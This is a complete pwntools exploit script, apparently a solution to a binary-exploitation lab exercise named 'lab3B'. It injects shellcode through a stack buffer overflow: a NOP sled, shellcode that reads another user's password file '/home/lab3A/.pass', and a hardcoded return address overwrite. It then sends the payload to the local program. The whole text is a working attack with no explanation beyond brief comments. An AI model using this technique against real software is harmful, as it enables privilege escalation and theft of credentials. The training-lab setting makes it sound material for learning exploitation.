from pwn import *
pwnlib.args.SILENT('SILENT')

# Create space on stack so we don't mess up shellcode
shellcode = asm('add esp, -0x200')

# Cat the password and exit
shellcode += asm(shellcraft.linux.cat('/home/lab3A/.pass'))
shellcode += asm(shellcraft.linux.exit())

# Create NOP sled before shellcode
buf = '\x90' * (156 - len(shellcode)) + shellcode

# Overwrite return address. Different machine to machine
buf += p32(0xffffd510)

# Perform exploit
p = process('./lab3B')
p.sendline(buf)
p.interactive()
